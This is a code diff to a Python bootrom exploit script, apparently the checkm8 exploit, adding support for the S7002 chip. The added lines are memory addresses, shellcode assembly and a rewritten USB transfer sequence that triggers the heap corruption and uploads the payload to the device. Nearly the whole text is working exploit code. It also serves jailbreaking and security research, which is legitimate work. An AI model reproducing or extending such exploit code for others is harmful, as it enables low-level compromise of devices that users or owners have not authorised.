@@ -283,6 +283,30 @@ def payload(cpid):
     assert len(t8004_shellcode) <= PAYLOAD_OFFSET_ARMV7
     assert len(t8004_handler) <= PAYLOAD_SIZE_ARMV7
     return t8004_shellcode + '\0' * (PAYLOAD_OFFSET_ARMV7 - len(t8004_shellcode)) + t8004_handler
+  if cpid == 0x7002:
+    constants_usb_s7002 = [
+                0x46018000, # 1 - LOAD_ADDRESS
+                0x65786563, # 2 - EXEC_MAGIC
+                0x646F6E65, # 3 - DONE_MAGIC
+                0x6D656D63, # 4 - MEMC_MAGIC
+                0x6D656D73, # 5 - MEMS_MAGIC
+                  0x6E58+1, # 6 - USB_CORE_DO_IO
+    ]
+    constants_checkm8_s7002 = [
+                0x460057D8, # 1 - gUSBDescriptors
+                0x46005958, # 2 - gUSBSerialNumber
+                  0x6744+1, # 3 - usb_create_string_descriptor
+                0x4600034A, # 4 - gUSBSRNMStringDescriptor
+                0x46007800, # 5 - PAYLOAD_DEST
+      PAYLOAD_OFFSET_ARMV7, # 6 - PAYLOAD_OFFSET
+        PAYLOAD_SIZE_ARMV7, # 7 - PAYLOAD_SIZE
+                0x46005898, # 8 - PAYLOAD_PTR
+    ]
+    s7002_handler = asm_thumb_trampoline(0x46007800+1, 0x7080+1) + prepare_shellcode('usb_0xA1_2_armv7', constants_usb_s7002)[8:]
+    s7002_shellcode = prepare_shellcode('checkm8_armv7', constants_checkm8_s7002)
+    assert len(s7002_shellcode) <= PAYLOAD_OFFSET_ARMV7
+    assert len(s7002_handler) <= PAYLOAD_SIZE_ARMV7
+    return s7002_shellcode + '\0' * (PAYLOAD_OFFSET_ARMV7 - len(s7002_shellcode)) + s7002_handler
   if cpid == 0x8010:
     constants_usb_t8010 = [
                0x1800B0000, # 1 - LOAD_ADDRESS
@@ -462,6 +486,7 @@ def exploit_config(serial_number):
 
 def exploit():
   print '*** checkm8 exploit by axi0mX ***'
+  print '*** s7002 support by a1exdandy & ChiptuneXT ***'
 
   device = dfu.acquire_device()
   start = time.time()
@@ -469,18 +494,14 @@ def exploit():
   if 'PWND:[' in device.serial_number:
     print 'Device is already in pwned DFU Mode. Not executing exploit.'
     return
-  payload, config = exploit_config(device.serial_number)
 
-  if config.large_leak is not None:
-    usb_req_stall(device)
-    for i in range(config.large_leak):
-      usb_req_leak(device)
-    usb_req_no_leak(device)
-  else:
-    stall(device)
-    for i in range(config.hole):
-      no_leak(device)
-    usb_req_leak(device)
+  padding = 0x200 + 0x80 + 0x80
+  overwrite = struct.pack('<20xI', 0x46018000)
+  payload_7002 = payload(0x7002)
+
+  stall(device)
+  leak(device)
+  for i in range(80):
     no_leak(device)
   dfu.usb_reset(device)
   dfu.release_device(device)
@@ -488,21 +509,21 @@ def exploit():
   device = dfu.acquire_device()
   device.serial_number
   libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x800, 0.0001)
+  libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, 'A' * padding, 10)
   libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0)
   dfu.release_device(device)
 
   time.sleep(0.5)
 
   device = dfu.acquire_device()
+  device.serial_number
   usb_req_stall(device)
-  if config.large_leak is not None:
-    usb_req_leak(device)
-  else:
-    for i in range(config.leak):
-      usb_req_leak(device)
-  libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, config.overwrite, 100)
-  for i in range(0, len(payload), 0x800):
-    libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0, payload[i:i+0x800], 100)
+  usb_req_leak(device)
+  usb_req_leak(device)
+  usb_req_leak(device)
+  libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, overwrite, 100)
+  for i in range(0, len(payload_7002), 0x800):
+    libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0, payload_7002[i:i+0x800], 100)
   dfu.usb_reset(device)
   dfu.release_device(device)
 
